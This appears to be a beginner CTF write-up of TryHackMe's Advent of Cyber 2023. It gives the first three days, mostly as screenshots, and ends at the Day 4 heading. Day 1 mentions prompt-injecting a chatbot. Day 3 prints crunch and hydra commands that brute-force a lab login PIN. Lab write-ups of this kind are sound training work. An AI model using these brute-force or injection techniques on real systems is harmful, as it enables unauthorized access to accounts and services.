# [Advent of Cyber 5 [2023]](https://tryhackme.com/room/adventofcyber2023)

> Get started with Cyber Security in 24 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 1: Chatbot, tell me, if you're really safe?

use some tricky question to inject the prompt

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/22a1a05a-dba6-46af-bd35-240f9a448b0c)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eb2fb2a0-9b35-4047-ba20-2b4f07e19faf)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8a64872c-36cd-4aef-9be4-a58119889650)

## Day 2: O Data, All Ye Faithful

start the machine, you will see a browser of jupiter notebook and the instruction on that

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e9940e00-769a-4e55-a072-0d21f92a4efc)

click on notebook `4_Capstone` we have a datasheet network_traffic.csv and a workbook, open it

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3e3d2fd4-d920-4a3e-b060-65d69e04a5b2)

question 2

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bc62e3e1-af24-46cc-896f-74bd11cd6758)

question 3

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ee1a1853-6439-4389-88c2-33d1d6cf00d4)

question 4

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c8c15eae-a62c-4e7e-9e8e-d10719f680b2)

if you got error 'df' not found, so click on "restart the kernel and run all cells"

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/dfff452a-234b-4fd8-9758-07c90951ef46)

## Day 3: Hydra is Coming to Town

start the machine and access it on port 8000

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/17e6c66d-fe82-4005-8a46-26364f2d4ae7)

view source code, i see it post the pin to login.php or you can catch the request with burpsuite

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eda3942b-76ce-44ce-b0b6-bc1cbdfae732)

generate the wordlist

```
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```

crack the pass with hydra

```
hydra -l '' -P 3digits.txt -f 10.10.125.189 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a9fcf49c-e97b-44a0-966c-12cb80f6ba6b)

enter the pin

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1dffafc4-68b0-47bc-ac3a-b7653f281989)

here you go

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/07b31e88-e14b-4709-b689-7eab2adc7417)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f77ccd4b-f02f-4711-873b-95e79c952e06)

## Day 4: Baby, it's CeWLd outside























































